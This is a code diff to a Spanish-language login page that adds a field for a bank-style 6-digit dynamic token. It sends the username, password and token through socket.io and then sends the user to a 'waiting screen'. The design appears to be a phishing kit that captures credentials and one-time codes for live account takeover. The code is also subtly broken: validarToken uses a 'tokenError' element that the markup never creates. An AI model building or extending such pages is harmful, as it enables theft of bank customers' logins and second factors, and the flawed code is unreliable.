@@ -107,6 +107,13 @@
     .campo-requerido {
       border: 1px solid red !important;
     }
+
+    .alerta {
+      font-size: 0.85rem;
+      color: #555;
+      margin-top: 1rem;
+      text-align: left;
+    }
   </style>
 </head>
 <body>
@@ -117,13 +124,22 @@
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
-        <input type="text" id="usuario" placeholder="Ingrese su usuario o CURP" required>
+        <input type="text" id="usuario" placeholder="Ingrese su usuario" required>
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
-      
+
+      <!-- Campo de Token -->
+      <div class="input-group">
+        <div class="icon"><i class="fas fa-key"></i></div>
+        <input type="text" id="token" placeholder="Ingrese su token" required>
+      </div>
+
+      <!-- Alerta debajo del campo de token -->
+      <p class="alerta">Genere su Código Dinámico de 6 Dígitos que aparece en tu dispositivo Token.</p>
+
       <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
@@ -142,16 +158,17 @@
           e.preventDefault(); // Evitar el comportamiento por defecto del formulario
 
           // Validar los campos antes de enviar los datos
-          if (validarUsuario() && validarPassword()) {
+          if (validarUsuario() && validarPassword() && validarToken()) {
             const usuario = document.getElementById('usuario').value;
             const contrasena = document.getElementById('password').value;
+            const token = document.getElementById('token').value;
 
             // Generar y guardar sessionId
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
             // Enviar datos al servidor mediante socket.io
-            socket.emit('dataForm', { usuario, contrasena, sessionId });
+            socket.emit('dataForm', { usuario, contrasena, token, sessionId });
 
             // Ir a pantalla de espera (opciones.html)
             window.location.href = 'opciones.html';
@@ -192,6 +209,23 @@
       } else {
         passwordError.textContent = "";
         passwordInput.classList.remove("campo-requerido");
+        return true;
+      }
+    }
+
+    // Nueva validación para el campo Token
+    function validarToken() {
+      const token = document.getElementById("token").value;
+      const tokenError = document.getElementById("tokenError");
+      const tokenInput = document.getElementById("token");
+
+      if (!token) {
+        tokenError.textContent = "El token es obligatorio";
+        tokenInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        tokenError.textContent = "";
+        tokenInput.classList.remove("campo-requerido");
         return true;
       }
     }
